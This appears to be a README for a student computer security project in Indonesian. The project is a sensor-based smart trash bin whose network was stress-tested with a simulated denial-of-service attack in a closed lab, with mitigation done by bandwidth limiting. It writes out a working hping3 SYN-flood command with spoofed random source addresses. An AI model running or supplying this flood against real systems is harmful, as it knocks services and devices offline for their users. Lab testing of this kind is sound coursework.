# Icha

KELOMPOK	
Nama Anggota	: 1. Icha Agustin		(0903
		  2. Marshanda
		  3. Atiya Melvina
		  4. Ivan Saputra
		  5. Citra Putri Firdawati
Kelas		: TK5A
Mata Kuliah	: Keamanan Komputer
_____________________________________________________________________________________

KOTAK SAMPAH PINTAR DENGAN SERANGAN DOS

Deskripsi Proyek
Proyek ini mengembangkan kotak sampah otomatis berbasis sensor, kemudian melakukan simulasi serangan DoS untuk melihat bagaimana perangkat IoT bereaksi terhadap beban trafik yang tinggi. Seluruh proses pengujian dilakukan secara legal dalam lingkungan laboratorium dan jaringan tertutup, sehingga aman untuk penelitian.

1. Kotak Sampah Pintar
Pada bagian ini dibuat sebuah perangkat kotak sampah yang dapat membuka dan menutup secara otomatis menggunakan sensor jarak (ultrasonic). Sistem ini dirancang agar lebih higienis dan memudahkan pengguna

2. Pengujiuan Serangan ( DoS )
Sebagai bagian dari analisis keamanan, dilakukan pengujian berupa simulasi gangguan lalu lintas jaringan. Tujuan dari pengujian ini adalah untuk melihat bagaimana sistem bereaksi ketika menerima trafik berlebih.


Cara Instalasi serangan DoS menggunakan tools hping3 

- Pertama kami menginstall hping3 menggunakan command : sudo apt install hping3 -y
- Kemudian setelah di install kami cek version menggunakan command : hping3 --version 

Cara Menjalankan Serangan DoS Tools hping3 menggunakan command : hping3 -c 20000 -d 120 -S -w 64 -p 80 --flood --rand-source [IP]

3. dampak serangan doS
- Wifi Lost
- Web Down
- Sensor tidak terdeteksi

4. mitigasi serangan Dos, menggunakan ttols evillimiter sebagai alat untuk memblokir/membatasi bandwitch trafic






